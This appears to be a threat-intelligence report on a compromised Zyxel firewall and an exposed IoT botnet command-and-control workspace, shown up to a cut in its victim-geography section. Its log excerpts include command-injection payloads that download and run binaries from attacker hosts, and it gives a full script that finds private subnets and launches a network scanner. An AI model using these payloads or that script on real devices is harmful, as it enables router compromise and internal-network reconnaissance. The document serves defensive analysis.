---
title: 'From Infected Zyxel to Exposed C2: A Case Study in IoT Botnet Operations'
header: 'From Infected Zyxel to Exposed C2: A Case Study in IoT Botnet Operations'
og_description: 'An evidence-first analysis of an exposed operator working directory and C2 environment.'
og_image: '/assets/images/zyxel-c2/zyxel-c2-og.png'
tags: ['ThreatIntel']
---

This report documents the identification of previously concealed operational infrastructure, including an exposed operator working directory and command-and-control (C2) environment, following the investigation of low-volume authentication activity and a customer-authorized forensic analysis of a compromised Zyxel device. <!--more-->

*An evidence-first analysis of an exposed operator working directory and C2 environment*

## Executive Summary

This investigation demonstrates how low-volume identity telemetry can expose otherwise concealed activity involving compromised embedded devices and backend infrastructure. What began as a focused authentication hunt provided visibility into an operation that used compromised devices for access, staging, proxying, tasking, and scanning.

Forensic analysis of the customer-provided Zyxel device identified two likely independent unauthorized activity clusters: a lightweight SOCKS proxy foothold and a broader proxy and C2 ecosystem. Continued monitoring of the second cluster led to exposed backend directories containing artifacts that correlated with observations from the compromised device. Device-side evidence, including process trees, web-authentication logs, staged payloads, memory artifacts, and scanner execution traces, provided the runtime context needed to link observed activity to the operator infrastructure.

Analysis of the exposed backend server supported the device-side findings and indicated an active operator workspace rather than a standalone malware repository or release package. The recovered environment included C2 components, SQLite state, task results, payload-generation logic, staging services, scanner tooling, callback utilities, and VS Code Remote traces.

Our key findings are operational rather than attributional. The evidence supports a persistent backend environment linked to observed device compromise and indicates that infected devices were used beyond basic proxy access. We therefore focus on the operational links we can support: device compromise, backend infrastructure, tasking, scanning, and proxy-capable runtime deployment.

## Contents

- [1. From Low-Volume Auth Activity to Device Access](#1-from-low-volume-auth-activity-to-device-access)
- [2. Compromised Zyxel Device Analysis](#2-compromised-zyxel-device-analysis)
- [3. The Infrastructure Shift](#3-the-infrastructure-shift)
- [4. What Was Exposed](#4-what-was-exposed)
- [5. Shell History: How the Exposed Host Was Operated](#5-shell-history-how-the-exposed-host-was-operated)
- [6. Reconstructing the Operator Workflow](#6-reconstructing-the-operator-workflow)
- [7. Analytical Limits and Open Questions](#7-analytical-limits-and-open-questions)
- [8. Conclusion](#8-conclusion)
- [9. Infrastructure and IOC Notes](#9-infrastructure-and-ioc-notes)

---

## 1. From Low-Volume Auth Activity to Device Access

During routine threat hunting for suspicious authentication activity, we identified a limited set of structured Entra ID sign-in attempts targeting Azure PowerShell. Individually, these attempts appeared low-risk. When analyzed collectively, however, they exhibited a consistent pattern:

- narrow activity window
- repetitive request structure
- use of an Internet Explorer 11 user agent
- low login-attempt volume
- focused targeting
- no successful sign-ins because MFA was enabled
- activity occurring during normal business hours in UTC+8

These characteristics were consistent with Quad7-style authentication activity described in [MITRE ATT&CK C0055](https://attack.mitre.org/campaigns/C0055/).

The indicator set suggested coordinated activity rather than opportunistic scanning. We used the observed authentication activity as a pivot and shared selected Entra source IPs with a trusted information-sharing group. Additional sources operating in separate environments reported similar observations, providing sufficient confidence to compare identity-side telemetry with infrastructure-side pivots. During this collaboration, a C2 indicator was shared and used as a pivot for NetFlow analysis to identify connected infrastructure.

We correlated two datasets to assess infrastructure overlap and determine whether the authentication activity aligned with observed C2 communications: Entra authentication source IPs and NetFlow telemetry associated with the C2 indicator. While the datasets shared notable similarities, they were not fully consistent and required further analysis.

The differences between the two telemetry perspectives are summarized below:

<div style="display: flex; gap: 1.25rem; align-items: flex-start; flex-wrap: wrap; margin: 1.5rem 0;" markdown="1">
<div style="flex: 1 1 340px; min-width: 0; overflow-x: auto;" markdown="1">
<p style="margin: 0 0 0.5rem; font-weight: 600;">Entra source-IP view</p>

| Entra source-IP device fingerprint | Distribution |
| ---------------------------------- | ------------ |
| Zyxel USG40                     | 22%          |
| Zyxel USG60                     | 17%          |
| Zyxel USG20                     | 12%          |
| Zyxel ZyNOS other               | 8%           |
| Zyxel USG20W                    | 8%           |
| Zyxel USG310                    | 5%           |
| Zyxel NSG50                     | 5%           |
| Zyxel USG110                    | 4%           |
| Zyxel USG40W                    | 3%           |
| Zyxel NSG100                    | 3%           |
| Zyxel USG210                    | 2%           |
| Zyxel USG60W                    | 2%           |
| Zyxel NSG300                    | 1%           |
| unknown                         | 9%           |

</div>
<div style="flex: 1 1 340px; min-width: 0; overflow-x: auto;" markdown="1">
<p style="margin: 0 0 0.5rem; font-weight: 600;">C2 / NetFlow view</p>

| C2 / NetFlow device fingerprint | Distribution |
| ------------------------------- | ------------ |
| D-Link DIR-600                   | 16%          |
| Zyxel USG20W                     | 13%          |
| Zyxel USG20                      | 11%          |
| Zyxel Unknown                    | 10%          |
| Zyxel USG60                      | 8%           |
| Zyxel USG40                      | 6%           |
| Zyxel USG210                     | 5%           |
| Zyxel ZyNOS other                | 3%           |
| D-Link DIR-100                   | 2%           |
| Zyxel USG110                     | 1%           |
| Zyxel USG60W                     | 1%           |
| Zyxel VPN 100                    | 1%           |
| Zyxel USG310                     | 1%           |
| Zyxel USG40W                     | 1%           |
| Zyxel NSG50                      | 1%           |
| unknown                          | 20%          |

</div>
</div>

The Entra source-IP view was dominated by Zyxel fingerprints. By contrast, the C2 / NetFlow view, limited to AS3320, covered a similar number of unique IPs over a shorter observation window but reflected a broader embedded-device mix.

The Entra dataset contained approximately 150 unique IPs over 30 days. The C2 / NetFlow dataset contained approximately 150 unique IPs over 7 days. This difference is relevant because the identity-side telemetry narrowed the investigation primarily toward Zyxel devices, while the infrastructure-side telemetry indicated a broader embedded-device pool.

One customer IP appeared in both datasets. After contacting the customer, we confirmed that the affected system was a Zyxel NSG100 and obtained consent to acquire it for forensic analysis and controlled honeypot monitoring.

This correlation provided sufficient basis to continue the investigation. It established an investigative lead linking low-volume authentication activity, embedded-device telemetry, and C2-adjacent infrastructure.

---

## 2. Compromised Zyxel Device Analysis

The customer-provided Zyxel device gave us the first host-side view of the operation. Instead of relying only on identity telemetry, NetFlow, and external fingerprints, we gained access to the live operational state of the compromised system, including process trees, filesystem paths, environment variables, open sockets, live network behavior, and memory from active processes.

The device was a Zyxel NSG100 running the most recent firmware available for that model at the time of acquisition. All artifacts described below were located in writable temporary directories (`/tmp` and `/var/tmp`), so none of the observed infections survived a reboot.

The device showed at least two operationally distinct activity clusters.

### 2.1 `zysocks5` Cluster

We name this cluster after its most visible artifact, `zysocks5`. It behaved like a lightweight SOCKS proxy deployment: it exposed a SOCKS listener, used `zysocks5.auth`, and appeared focused on proxy access rather than a larger tasking framework.

On the customer device, this cluster left a small set of files under `/tmp`. The authentication file is included as an artifact because it was referenced by the active command line (see the table below). Its observed format was consistent with a username:password pair, consisting of two six-character fields separated by a colon.


| Artifact / indicator | Observed role                                                                         | Indicator                                                         |
| -------------------- | ------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `zysocks5`           | SOCKS listener binary                                                                 | `46ab8d0ccb961dc28218f1ff31b429363634f6b1a9b29622d8736fc2f214da9a` |
| `wget`               | downloaded helper binary                                                              | `3cfbfbb967dc36996a345a7a79ee28112be0a082c8523b6fbf9bac824ef996f0` |
| `wget.py`            | Python fetcher for `http://194.156.98[.]120/mips64n32/wget`                           | `47dd7a3890e85e92b728e667228bc119b299cf53f8f648d42fbab2a9948d0c33` |
| `zysocks5.auth`      | likely `username:password` credential file passed with `-a`; two six-character fields | present, value withheld                                           |
| staging host         | host referenced by `wget.py` for `mips64n32/wget` delivery                            | `194.156.98[.]120`                                                |
| web-CGI source       | source observed in Zyxel web logs for `export-cgi` and `file_upload-cgi` requests     | `194.195.90[.]145`                                                |


The `zysocks5` and `wget` binaries were not unique to this device. Targeted public-reputation and trusted-source pivots had previously seen both binaries on IP addresses that prior reporting associated with Quad7. A trusted source also observed multiple outbound connections from the running `zysocks5` process to Entra ID endpoint IPs, tying the device-side proxy foothold back to the identity-facing activity without proving operator identity.

Representative runtime evidence showed the process listening on TCP `46751` as UID `99` / `nobody`:

```text
tcp 0 0 0.0.0.0:46751 0.0.0.0:* LISTEN 99 379852 24071/zysocks5
nobody 24071 ... zysocks5 -p 46751 -a zysocks5.auth -d
```

The process environment explained how the binary had been started. On Unix-like systems, a child process can inherit environment variables from the program that launched it. Here, `/proc` still preserved request fields from the Zyxel web interface:

```text
REQUEST_URI=/cgi-bin/file_upload-cgi?v=/dummy.html
PWD=/tmp
_=/tmp/zysocks5
```

Web logs from the same period showed requests for exporting the startup configuration followed by `file_upload-cgi` POSTs from `194.195.90[.]145` — evidence that `zysocks5` was launched through the Zyxel web-CGI path rather than from an interactive local shell.

Based on that file and connection context, we assess that this cluster was likely the activity we saw in the initial threat hunt. It also represents another possible connection to the Quad7 context, without proving attribution to Quad7. The remainder of this blog post does not focus on the zysocks5 cluster, which remains under separate monitoring and analysis. Instead, this post follows the distinct xserver/MIPS activity that subsequently linked the infected Zyxel device to the exposed backend environment.

### 2.2 `xserver` Cluster

This cluster was also observed on the acquired compromised Zyxel device and is the focus of the remainder of this report. On the device, it appeared as a staging chain with compact binaries, tokenized delivery paths, decoded configurations, and a larger runtime.

#### 2.2.1 Staging, Implants, and Delivery Shifts

##### Earlier `/tmp/` staging

The device did not exhibit a single, consistent staging pattern. Instead, at least three generations of staging activity were observed. The earliest observed chain used `/tmp/`, a writable temporary directory on the Zyxel. Based on timestamps, process lineage, and file context, three files could be tied to this cluster:

```text
/tmp/
|-- mips
|-- 83ef
`-- 2e89
```

Here, `/tmp/83ef` and `/tmp/2e89` were compact binaries with random-looking local names. In addition to downloader-like behavior, both binaries exposed Linux connection-state inspection strings, including `/proc/net/tcp`, `/proc/net/tcp6`, `/proc/%s/fd`, `/proc/%s/fd/%s`, and `/proc/%d/exe`. Binary comparison showed that the two files shared the same `.text`, `.rodata`, and `.got` sections, while `.data` differed, consistent with configuration variation inside the same build line. The observed `/tmp/mips` file was a larger runtime launched by that staging chain.

Zyxel webserver logs preserved the delivery commands for the two compact stagers. Line breaks in the log excerpts below are added for readability:

```text
[pid 21317] [client 38.180.190[.]115:37222]
  The client browser has arip cookie.
  arip=127.0.0.1|curl -o /tmp/83ef \
    http://38.180.190[.]115:23323/hqsz720f2a

[pid 11053] [client 38.180.190[.]115:58590]
  The client browser has arip cookie.
  arip=127.0.0.1|curl -o /tmp/2e89 \
    http://38.180.190[.]115:23323/hqsz494354
```

Static and sandbox triage also showed Mirai/Gafgyt-like traits in this first stager generation. This is code and behavior resemblance only; it does not establish actor attribution, nor a claim that the later stagers belong to Mirai/Gafgyt.

The process tree then showed how one branch of the chain executed. A shell command created from a web request launched `/tmp/83ef`, and `/tmp/83ef` launched `/tmp/mips`:

```text
sh -c /usr/sbin/matchfp 38.180.190[.]115 127.0.0.1|/tmp/83ef
`-- /tmp/83ef
    `-- /tmp/mips
```

As with `zysocks5`, the process environment preserved the launch context. Here, `/proc/$mips_pid/environ` still held request metadata from the Zyxel web-authentication endpoint:

```text
REQUEST_URI=/weblogin.cgi
HTTP_COOKIE=arip=127.0.0.1|/tmp/83ef
REMOTE_ADDR=38.180.190[.]115
```

Three fields carry the chain: `REQUEST_URI` names the web-authentication handler, `HTTP_COOKIE` preserved the `arip` value containing the staged local path, and `REMOTE_ADDR` preserved the source of that request. That is enough to reconstruct the launch path without knowing the underlying vulnerability: a Zyxel web request led to the local staging binary, and from there to the running `/tmp/mips` runtime.

We developed an initial extractor for the legacy format and decoded an XOR-obfuscated configuration record from `.data`:

```text
id16: <redacted unresolved 16-byte value>
port: 443
host: 38.180.190[.]115
arch: mips
callback_url: <redacted customer-specific callback URL>
```

Later reinfection logs from the controlled device showed a second generation. The delivery pattern still used `/tmp/`, random-looking four-character local filenames, and tokenized `hqsz*` paths, but the binaries had moved to a newer appended-configuration format:

```text
2026-05-06T05:56:17+00:00 src="94.74.85[.]247:0" dst="0.0.0.0:0"
  msg="weblogin.c-main(2142) arip = 127.0.0.1|curl -o /tmp/30ed \
    http://94.74.85[.]247:23323/hqsz97cfb9"

2026-05-06T05:56:17+00:00 src="94.74.85[.]247:0" dst="0.0.0.0:0"
  msg="weblogin.c-main(2142) arip = 127.0.0.1|curl -o /tmp/89c1 \
    http://94.74.85[.]247:23323/hqszb795ea"
```

We extended the extractor to support this format and decoded the files through an EOF trailer path: trailer magic `0xDEAEC0DE`, CRC32 over the encrypted blob, and an RC4-decrypted configuration. The new layout was:

```text
id16: <redacted unresolved 16-byte value>
port: 8888
host: sd.clubde[.]xyz
arch: mips
```

During that phase of the investigation, we observed two substantially similar `hqsz` files as part of the same infection flow. Both files had a similar decoded configuration structure, but the reason for two separate files remained unresolved. This second generation remains unattributed beyond the infrastructure and runtime cluster followed in this report.

##### Later `/var/tmp/` staging

Later observations showed staging move to `/var/tmp/`, followed shortly by another visible delivery change:

```text
/var/tmp/
|-- abc
|-- mips
`-- tmpfile
```

The logs show the same web-authentication injection surface used to stage and execute `/var/tmp/abc`:

```text
2026-05-23T03:57:31+00:00 src="94.74.85[.]247:0" dst="0.0.0.0:0"
  msg="weblogin.c-main(2142) arip = 127.0.0.1|curl -o /var/tmp/abc \
    http://94.74.85[.]247:1098/mips"

2026-05-23T03:57:37+00:00 src="94.74.85[.]247:0" dst="0.0.0.0:0"
  msg="weblogin.c-main(2142) arip = 127.0.0.1|chmod 777 /var/tmp/abc"

2026-05-23T03:57:38+00:00 src="94.74.85[.]247:0" dst="0.0.0.0:0"
  msg="weblogin.c-main(2142) arip = 127.0.0.1|/var/tmp/abc"
```

This sequence shows the later chain directly: download the remote path `/mips` as the local file `/var/tmp/abc`, mark it executable, and launch it from `/var/tmp/`.

The naming is easy to misread. In this later chain, `mips` first appears as the filename on the HTTP staging endpoint, but the downloaded file is saved locally as `/var/tmp/abc`. After `/var/tmp/abc` runs, the device can still end up with the same larger local runtime named `/var/tmp/mips`. In other words, remote `/mips` and local `/var/tmp/abc` refer to the same downloaded artifact, while local `/var/tmp/mips` is a separate runtime.

Compared with the second `/tmp` generation, the tokenized `hqsz*` path disappeared from the visible delivery URL. The remote file was now a stable `/mips` path, saved locally as `/var/tmp/abc`; in later reinfections, that source path and local filename remained consistent.

The same EOF-trailer extraction path still worked, and the decoded structure stayed consistent with the second-generation `hqsz*` stagers: `sd.clubde[.]xyz`, port `8888`, and `mips`. What changed here was the staging path and the naming, while the config family stayed the same.

The later `hqsz*` and `/var/tmp/abc` stagers carried encrypted appended configuration and connected to operator infrastructure. Some later builds also exposed proxy-related functionality.

The two configuration records shown above are examples, picked because they mark the format change. We did not need config extraction to notice the infrastructure moving. Each time the honeypot was re-infected, the delivery logs and the captured traffic already named the new staging and C2 host. Config extraction came afterwards. It confirmed what the traffic had shown and, more importantly, let us tie a specific host and port to a specific sample. 


#### 2.2.2 The Large `mips` Runtime on the Device

This section focuses on the larger `/tmp/mips` or `/var/tmp/mips` runtime introduced above. The analysis is based on process maps, reconstructed stack/environment data, and memory extracted from the active process.

The process context linked the larger `mips` runtime back to the preceding staging chain. The recovered process environment did not contain direct command-line login flags for the proxy runtime. Instead, reconstructed stack/environment data preserved the CGI/request context used during staging. The `arip` cookie referenced `/var/tmp/abc`, the compact binary downloaded and executed immediately before the larger `mips` runtime appeared on the device.

This indicates that the larger runtime was launched through, or handed off from, the compact staging artifact, rather than started directly with proxy credentials on the command line. The exact parser or handoff mechanism remains unresolved.

Memory analysis of the running `mips` process then recovered a URL-encoded WebSocket configuration payload associated with `api.iproyal[.]com`. IPRoyal/Pawns refers to a [residential-proxy client ecosystem](https://pawns.app/); the evidence supports protocol and runtime compatibility with this style of reverse-proxy agent, not provider-side attribution. The decoded structure included a reverse-proxy server, proxy credentials, and metadata declaring `driver_alias` as `ssh-reverse-proxy`:

```json
{
  "ip": "<proxy_server_ip>",
  "port": 9494,
  "username": "<redacted>",
  "password": "<redacted>",
  "Meta": {
    "cpus": "4",
    "device_id": "",
    "driver_alias": "ssh-reverse-proxy",
    "hostname": "",
    "ip_hostnames": "",
    "os_name": "MerryIoTHotspotV<redacted_suffix>",
    "ram_size": "63",
    "user_ip": "<redacted_victim_ip>",
    "username": ""
  }
}
```

The `Meta` block deserves a second look. The agent registers the device as a `MerryIoTHotspot` with four CPUs and 63 GB of RAM. Our device is a Zyxel NSG100. Whatever produces this metadata is not reading it from the host it runs on, which limits how far provider-side device classification can be trusted for this kind of enrollment.

Runtime memory also contained `access_token`, `available_ip`, `available_port`, `server_ip`, `server_port`, `traffic_sold`, `forwarded-tcpip`, and status messages such as `hi` and `balance_ready`. Those strings matter because they describe live reverse-proxy state: authentication material, assigned relay endpoints, traffic accounting, SSH tunnel forwarding, and readiness messages. This is state read out of a running process. The agent was relaying traffic while we observed it.

We classify the runtime as an IPRoyal/Pawns-compatible reverse-proxy agent observed on the compromised Zyxel; exact lineage remains open.

#### 2.2.3 Local-Network Scanner: `gogo.sh` and `gogo_linux_mips`

After the stager sequence had moved beyond the first Mirai/Gafgyt-like generation, we found another device-side capability: local-network scanning. On the controlled Zyxel, both `gogo.sh` and `gogo_linux_mips` were present, and `/tmp/1.json` contained scanner output from the private network reachable from the device.

`gogo.sh` is a launcher. It changes into `/tmp`, removes `/tmp/1.json`, derives private RFC1918 `/24` ranges from `ifconfig`, excludes loopback, and starts the scanner in the background:

```sh
#!/bin/sh

cd /tmp

rm -f /tmp/1.json

IPS=$(ifconfig | awk '/inet /{
  gsub(/addr:/, "")
  split($2, a, ".")
  print a[1]"."a[2]"."a[3]".0/24"
}' | grep -v '127.0.0' | grep -E '^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)' | sort -u | tr '\n' ',')

echo "Extracted IPs: ${IPS%,}"

if [ -z "${IPS%,}" ]; then
  echo "[-] No private IP found!"
  exit 1
fi


/tmp/gogo_linux_mips -i "${IPS%,}" -p top2,win,db -ev -t 50 -f /tmp/1.json -o json &
```

The output file is significant because it demonstrates execution, not only deployed capability. The recovered `/tmp/1.json` began with the scanner run configuration and contained 18 service findings across seven private RFC1918 hosts reachable from the controlled device. The findings included SSH, FTP, SMB/NetBIOS, HTTP/HTTPS services, and HTTP fingerprint matches consistent with Fortinet/FortiGate-style detections. The file confirms that the scanner enumerated live devices reachable from the compromised router.

The scanner binary, `gogo_linux_mips`, is a stripped, statically linked MIPS big-endian Go executable. The filename, CLI shape, and port-profile flags are consistent with the public [`chainreactors/gogo`](https://github.com/chainreactors/gogo) scanner project, which describes itself as a controllable automated scanning engine for red teams. Strings indicate DNS, TCP, UDP, HTTP, and socket fingerprinting logic, including token/finger match concepts.

The full sequence is therefore visible end to end: `gogo.sh` deployed to an infected device, private subnets derived from the device's own interfaces, `gogo_linux_mips` run against selected service profiles, and JSON results written to `/tmp/1.json`.

---

## 3. The Infrastructure Shift

The Zyxel evidence gave us concrete anchors for continued monitoring of the `xserver` cluster: staging hosts, tokenized delivery paths, decoded C2 configuration, recurring reinfection behavior, and the larger runtime launched on the device. The starting point for that monitoring was the C2 indicator shared through the trusted group described in [Section 1](#1-from-low-volume-auth-activity-to-device-access). Using those anchors, we tracked four C2 and staging generations between December 2025 and our June 2026 monitoring window. Each generation surfaced the same way: the honeypot was re-infected, and the delivery logs and captured traffic named a new host.

| Monitoring point | Host | What we saw |
| --- | --- | --- |
| Customer infection | `38.180.190[.]115` | Relevant `xserver` staging and C2 address on the affected Zyxel. |
| Later follow-up | `154.213.177[.]40` | Similar activity continued on a later host. |
| Early April 2026 | `13.210.186[.]13` | The same cluster continued from another host. |
| Later monitoring | `94.74.85[.]247` | Continued staging behavior; a later DNS check resolved `sd.clubde[.]xyz` to this host. |

At some transition points, old and new infrastructure connections briefly overlapped. We therefore treated these hosts as adjacent generations of the same cluster, while keeping each observation tied to the behavior seen on that specific host.

During April 2026, the host `13.210.186[.]13` changed the scope of the analysis because routine validation showed exposure beyond a staging endpoint. Several services returned directory listings and revealed operator-side working directories. We use `dump` throughout the rest of this report to refer to the collected copy of those exposed directories and files. By the time activity later moved to `94.74.85[.]247`, that additional exposed surface was no longer available.

A note on collection: everything described below came from services that returned directory listings to unauthenticated HTTP requests. We used no credentials, exploited no vulnerability, and wrote nothing to the host. The recovered binaries and databases were analyzed and executed in a network-isolated lab.

The dump itself was not a single clean generation of tooling. It contained multiple versions and several references to the earlier `38.180.190[.]115` infrastructure. Based on the later device and honeypot observations, we treat those `38.180.190[.]115`-referencing binaries as older generation artifacts that were likely no longer the active delivery path when the dump was collected.

Observed exposed service categories on `13.210.186[.]13` included:

- SSH
- plain HTTP staging
- Python `SimpleHTTPServer` directory listings
- Go `net/http` services
- PHP CLI server
- Uvicorn

Some services behaved like staging endpoints and directly served MIPS payloads. Additional exposed services provided access to broader directory listings, revealing further portions of the operator working directories. The following section details the recovered artifacts and the evidence connecting server-side files with activity observed on the compromised device.

---

## 4. What Was Exposed

The exposed host revealed an operator working directory rather than a clean release package or isolated malware repository. The recovered material included overlapping component generations, copied binaries, SQLite state, task output, upload directories, temporary payloads, scan results, development artifacts, and operational tooling.

The most relevant recovered areas combined C2 framework components, staging services, operator-side scan tooling, and workflow artifacts. Several of these components implement *tasking*: an operator sends a command to an implant and later collects the result, typically as a stored task/result record rather than an interactive shell session.

Database note: within the recovered frameworks, `.bdb` files were used as SQLite victim or node inventories (backed by tables literally named `clients` in the recovered schemas), while `.cdb` files were used as SQLite listener or configuration stores. Schemas varied by component and generation, so treat these extensions as conventions local to this toolset.

| Artifact | Notable contents | Working interpretation |
| -------- | ---------------- | ---------------------- |
| `xserver/` | `ts`, `es`, `fs`, `.bdb`, `.cdb`, `beacons.bin`, `plugins.bin`, `ts_upload/gogo*` | TeamServer-style framework with node/listener databases, beacon/plugin material, file/post services, and the LAN scanner pair. |
| `move/` | `c2`, `c2new/c18`, `c2old/c2_old`, `es_new`, `task_results/`, `fserver/`, `dnslog/`, `df/` | Broad C2 and support framework covering victim state, listener surfaces, tasking, result processing, short-token file delivery, DNSLog support, and MIPS utilities. |
| `.vscode-server/` | Remote-SSH server files, edited tooling, terminal/session logs, tunnel/client traces | Operator workflow evidence from VS Code Remote; not malware by itself. |
| [`.bash_history`](#5-shell-history-how-the-exposed-host-was-operated) | Interactive shell commands for setup, service management, archive extraction, staging, and runtime checks | Host-level operator workflow evidence separate from the VS Code Remote artifacts. |
| `dnslog/` and `httplog/` | DNS callback logging, HTTP token logging, check/debug endpoints | Callback and token-verification tooling used around staging and task workflows. |
| `wget/` | Router/web-target payload samples and staging scripts | Payload samples and download/staging helpers. |
| `nmap/` | Host lists, sorted scan results, Python virtualenv, helper scripts | Operator-side external scan output and enrichment tooling; despite the folder name, it was not simply a copy of real `nmap`. |
| `df/` | Standalone MIPS ELF sibling of the `move/df` utility | Config-varied sibling of `move/df/mips` with the same connection-state utility role, related to the early `83ef` / `2e89` utility line. |
| `ts/` | Standalone `ts` binary, `.bdb`, `.cdb`, `ko.bin`, `plugins.bin` | Related standalone TeamServer build; unpacked Go metadata referenced `teamserver (devel)`, and the bundle shared core TeamServer roles with `xserver/ts` while remaining distinct by hash and feature surface. |
| Root-level artifacts | `c18`, `1111`, `ddd`, `1`, `.bdb`, `.cdb`, `move.taar` | Mixed runtime state, copied binaries, launchers, and an imported framework archive. |

The table above is intended as an operational map of the exposed environment rather than a full technical breakdown. We conducted substantially deeper component-level analysis of the recovered frameworks, databases, protocol handling, payload containers, tasking logic, VS Code Remote traces, and supporting tooling. We are open to technical exchange with interested defenders, researchers, and trusted partners where additional detail would support validation, detection, or follow-up analysis.

---

## 5. Shell History: How the Exposed Host Was Operated

The recovered `.bash_history` provided host-level evidence of operator workflow. The command history captured interactive setup and administration of the exposed C2 host, rather than activity generated by an implant or automated script.

High-signal command clusters include:

- SSH hardening or access changes: edits to `/etc/ssh/sshd_config`, `PasswordAuthentication`, `60-cloudimg-settings.conf`, and repeated `systemctl restart ssh`.
- Long-running component management through `screen`: sessions named `c2old`, `es`, `dnslog`, `tftp`, `wget`, `df`, `ts`, `es1`, `fs1`, and `httplog`.
- Archive/deployment activity: `tar -xf move.taar`, removal and re-extraction of `move/`, and later copying `ts`, `beacons.bin`, and `plugins.bin` between `uploads/`, `ts_upload/`, and the `xserver/` root.
- Tooling and service workspace setup: creation of `dnslog/`, `wget/`, `df/`, `httplog/`, `xserver/`, and `nmap/`.
- TFTP setup and troubleshooting: installation of `tftpd-hpa`, edits to `/etc/default/tftpd-hpa`, attempts to log TFTP activity, and repeated checks of UDP `:69`.
- HTTP staging: PHP and Python HTTP servers on non-standard ports, including attempts under `wget/`, `totolink/asp/`, and `xserver/tstmp/`.
- Public-scan workspace setup: creation of `nmap/`, installation of `nmap`, creation of a Python virtual environment, installation of `fastapi` and `uvicorn`, execution and editing of `server.py`, and use of a `tmux` session named `nmap`.
- Runtime checks: repeated `netstat`, `ps`, `killall fserver`, `screen -r`, `top`, `ufw`, `iptables`, and service status commands.

The history tells us what was installed, started, restarted and reconfigured over time. It says nothing about which of those components ran simultaneously.

It does explain the directory layout we recovered: several folders were created during interactive administration, components were run in detached terminal sessions, and tooling was repeatedly copied, restarted, and reconfigured. This was a server under hands-on maintenance, hosting multiple C2 and support components. Who that operator was, the history does not say.

---

## 6. Reconstructing the Operator Workflow

Collectively, the exposed files show how the environment was likely operated: payloads were generated and staged, implants checked in to victim databases, listeners were configured through SQLite state, tasks and scan results moved through backend components, and selected devices were used for scanning or proxy-style runtime deployment. This section connects those layers into an operator workflow instead of re-listing every recovered file, and builds on the interactive administration evidence from [Section 5](#5-shell-history-how-the-exposed-host-was-operated): several of the components discussed below (`ts`, `es`, `dnslog`) match the `screen` session names recovered from `.bash_history`.

![Operator workflow overview](/assets/images/zyxel-c2/operator-workflow-overview.svg){: .img-small }
*Figure 1: High-level operator workflow reconstructed from device and exposed-backend evidence.*

### 6.1 Staging and Config Generation

As described from the device-side evidence in [Section 2.2.1](#221-staging-implants-and-delivery-shifts), short-token paths such as `hqsz*` appeared in HTTP delivery URLs for generated payloads with per-sample configuration. These tokens should be read as staging paths, not as stable local filenames. Older i386/MIPS samples carried XOR-encoded embedded config, while later MIPS `xbeacon`-style samples carried encrypted config appended to the end of the file. The recovered configs exposed values such as host, port, architecture, and a 16-byte identifier.

After visible staging moved from `/tmp/` to `/var/tmp/`, the device logs no longer showed `hqsz*` delivery URLs. Tokenized generation may have continued server-side, but it was no longer visible in the same way from the device evidence.

### 6.2 Implant Online and Victim Databases

The exposed backend contained two SQLite databases with victim records, stored in tables literally named `clients` in the recovered schemas; we use "victim" in prose and reserve "client"/"clients" for the literal database and table names. These databases provide the clearest backend-side view of the infected-device population observed in the dump. Their timestamps and row counts also help describe how the backend population changed during the observed period.

Two database populations were present:

- `move/c2old/.bdb`: 9,034 victim rows
- `xserver/.bdb`: 2,914 victim rows

Despite the `c2old` path name, `move/c2old/.bdb` did not appear to be a cold archive. Its `clients` table stored `create_time` and `update_time` values for all 9,034 rows, and the aggregate `create_time` values showed continued growth across the observed period:

| Period based on `create_time` | New victim rows | Cumulative victim rows | Interpretation |
| --- | ---: | ---: | --- |
| February 2026 | 2,552 | 2,552 | The database was already being populated in February. |
| March 2026 | 5,439 | 7,991 | March represented the largest observed growth phase. |
| April 2026 | 1,043 | 9,034 | New rows were still being added into April 2026. |

Additional timestamp and binary evidence supports that interpretation. The largest `create_time` clusters occurred on February 5, 2026 (2,004 rows), March 11, 2026 (2,139 rows), and April 12, 2026 (932 rows), indicating bursty enrollment rather than steady linear growth. `update_time` values extended to April 20, 2026, and `c2_old` contained SQL logic for updating victim `status` and `update_time`, indicating that existing rows could still be refreshed near the dump date.

We interpret `c2old` as a filesystem label for an older or separate component. The database contents and timestamps show that it was still relevant near the dump date.

Our controlled honeypot device appeared in both populations. This supports the operational hypothesis of multiple backend streams or generations, but not exact old/new lineage by itself.

### 6.3 Victim Geography and Operator-Side Target Segmentation

The exposed victim data indicates a globally distributed infected-device population. The strongest evidence comes from `move/c2old/.bdb`, which contained 9,034 victim rows and 183 distinct populated `area` values.

The framework's stored `area` values were Chinese-language labels and did not provide a fully normalized country-level view. They mixed countries, cities or provinces, and broader regional descriptors. To standardize the geography assessment, we enriched the public IP values from `move/c2old/.bdb` with our GeoIP dataset. The GeoIP enrichment resolved all 9,034 rows to country-level results across 140 countries.

![World heat map of `move/c2old` victim rows by country](/assets/images/zyxel-c2/c2old-tisp-world-heatmap.png){: .img-small }
*Figure 2: World heat map of `move/c2old` victim rows by country, based on our GeoIP lookup.*

Top exposed victim countries in `move/c2old/.bdb`:

| Rank | Country | Victim rows | Share |
| ---- | ------- | ----------- | ----- |
| 1    | Russia | 953 | 10.5% |
| 2    | Italy | 790 | 8.7% |
| 3    | United States | 693 | 7.7% |
| 4    | France | 549 | 6.1% |
| 5    | Brazil | 459 | 5.1% |
| 6    | Taiwan | 419 | 4.6% |
| 7    | Ukraine | 410 | 4.5% |
| 8    | Bulgaria | 306 | 3.4% |
| 9    | Sweden | 284 | 3.1% |
| 10   | South Korea | 264 | 2.9% |

To compare the second victim database on the same basis, we applied the same GeoIP enrichment to the public `External` values in `xserver/.bdb`. The lookup resolved all 2,914 rows across 75 countries. The resulting distribution differs from `move/c2old/.bdb`. However, our controlled honeypot device appeared in both databases, supporting a relationship between the two populations without making them interchangeable.

Top exposed victim countries in `xserver/.bdb`:

| Rank | Country | Victim rows | Share |
| ---- | ------- | ----------- | ----- |
| 1    | Italy | 591 | 20.3% |
| 2    | France | 457 | 15.7% |
| 3    | United States | 278 | 9.5% |
| 4    | Switzerland | 218 | 7.5% |
| 5    | Sweden | 167 | 5.7% |
| 6    | South Korea | 147 | 5.0% |
| 7    | Austria | 111 | 3.8% |
| 8    | Taiwan | 105 | 3.6% |
| 9    | Spain | 76 | 2.6% |
| 10   | Germany | 76 | 2.6% |

#### Tooling Geography and Operator-Side Labels

Separate from victim geography, the recovered tooling also contained indicators of how geography and scan output were handled inside the operator environment.

